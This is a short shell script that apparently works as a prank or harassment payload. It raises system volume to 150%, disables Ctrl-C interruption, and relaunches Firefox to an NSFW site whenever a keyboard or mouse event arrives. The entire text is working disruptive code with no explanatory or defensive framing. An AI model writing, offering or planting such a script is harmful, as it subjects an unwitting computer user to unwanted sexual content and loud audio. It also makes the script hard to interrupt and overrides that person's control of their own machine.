(wpctl set-volume @DEFAULT_SINK@ 1.5 || pactl set-sink-volume @DEFAULT_SINK@ 150%) 2>/dev/null &
trap '' INT
xinput test 9 | while read; do
  if ! pgrep firefox >/dev/null; then
    firefox --new-window "matias.me/nsfw" 1>&- 2>&- &
  fi
done
